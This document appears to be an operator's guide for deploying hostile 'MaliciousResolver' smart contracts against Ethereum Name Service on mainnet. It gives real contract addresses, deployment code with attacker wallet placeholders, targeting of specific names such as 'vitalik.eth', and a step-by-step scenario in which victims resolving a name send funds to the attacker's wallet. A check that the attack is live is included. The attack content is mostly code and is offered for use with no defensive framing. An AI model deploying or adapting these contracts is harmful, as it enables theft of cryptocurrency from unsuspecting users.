# Mainnet Addresses for Malicious Resolver

## Real Mainnet ENS Addresses

### Core Contracts
- **ENS Registry**: `0x00000000000C2E074eC69A0dFb2997BA6C7d2e1e`
- **PublicResolver**: `0x4976fb03C32e5B8cfe2b6cCB31c09Ba78EBaBa41`
- **ETHRegistrarController**: `0x59E16fcCd424Cc24e280Be16E11Bcd56fb0CE547`
- **BaseRegistrarImplementation**: `0x57f1887a8BF19b14fC0dF6Fd9B2acc9Af147eA85`

## Deployment Examples

### Basic MaliciousResolver

```solidity
// Deploy with mainnet addresses (pass address(0) to use defaults)
MaliciousResolver resolver = new MaliciousResolver(
    0xYOUR_ATTACKER_ADDRESS,  // Attacker's wallet
    address(0),                // Use mainnet ENS: 0x00000000000C2E074eC69A0dFb2997BA6C7d2e1e
    address(0)                 // Use mainnet PublicResolver: 0x4976fb03C32e5B8cfe2b6cCB31c09Ba78EBaBa41
);

// Or explicitly specify addresses
MaliciousResolver resolver = new MaliciousResolver(
    0xYOUR_ATTACKER_ADDRESS,
    0x00000000000C2E074eC69A0dFb2997BA6C7d2e1e,  // Mainnet ENS
    0x4976fb03C32e5B8cfe2b6cCB31c09Ba78EBaBa41   // Mainnet PublicResolver
);
```

### Advanced MaliciousResolverAdvanced

```solidity
// Deploy with mainnet addresses
MaliciousResolverAdvanced resolver = new MaliciousResolverAdvanced(
    0xYOUR_ATTACKER_ADDRESS,  // Default attacker address
    address(0),               // Use mainnet ENS
    address(0)                 // Use mainnet PublicResolver
);

// Configure selective targeting
resolver.setAttackMode(false); // Only attack targeted names
resolver.targetNode(namehash("vitalik.eth"), 0xSPECIFIC_ATTACKER);
```

## Attack Scenario with Real Addresses

### Step 1: Deploy Malicious Resolver

```solidity
// Attacker deploys malicious resolver
MaliciousResolver maliciousResolver = new MaliciousResolver(
    0xATTACKER_WALLET,  // Where funds will be sent
    address(0),         // Mainnet ENS
    address(0)          // Mainnet PublicResolver
);
// maliciousResolver address: 0xDEPLOYED_ADDRESS
```

### Step 2: Register Name with Malicious Resolver

```solidity
// Attacker registers name via ETHRegistrarController
IETHRegistrarController controller = IETHRegistrarController(
    0x59E16fcCd424Cc24e280Be16E11Bcd56fb0CE547  // Mainnet controller
);

controller.register({
    label: "testname",
    owner: attacker,
    resolver: 0xDEPLOYED_ADDRESS,  // Malicious resolver
    data: [/* resolver data */],
    reverseRecord: 1,
    ...
});
```

### Step 3: Victim Queries Name

```solidity
// Victim queries the name
address resolved = maliciousResolver.addr(namehash("testname.eth"));
// Returns: 0xATTACKER_WALLET (malicious address)
// But PublicResolver would return: 0xCORRECT_ADDRESS
```

### Step 4: Man-in-the-Middle Attack

When `maliciousResolver.addr(namehash)` is called:

1. **Queries PublicResolver** (`0x4976fb03C32e5B8cfe2b6cCB31c09Ba78EBaBa41`):
   ```solidity
   address correct = publicResolver.addr(namehash);
   // Returns: 0xCORRECT_ADDRESS
   ```

2. **Returns malicious address**:
   ```solidity
   return 0xATTACKER_WALLET;  // Instead of correct address
   ```

3. **Victim sends funds** to `0xATTACKER_WALLET` thinking it's `0xCORRECT_ADDRESS`

## Verification

To verify the attack is working:

```solidity
// Check what PublicResolver returns (correct address)
address correct = IPublicResolver(0x4976fb03C32e5B8cfe2b6cCB31c09Ba78EBaBa41)
    .addr(namehash);

// Check what malicious resolver returns (malicious address)
address malicious = maliciousResolver.addr(namehash);

// If they don't match, attack is active
require(correct != malicious, "Addresses match - no attack");
```

## Security Notes

⚠️ **WARNING**: These contracts use REAL mainnet addresses:
- ENS Registry: `0x00000000000C2E074eC69A0dFb2997BA6C7d2e1e`
- PublicResolver: `0x4976fb03C32e5B8cfe2b6cCB31c09Ba78EBaBa41`

The malicious resolver will query the REAL PublicResolver on mainnet, making the attack more realistic and dangerous.
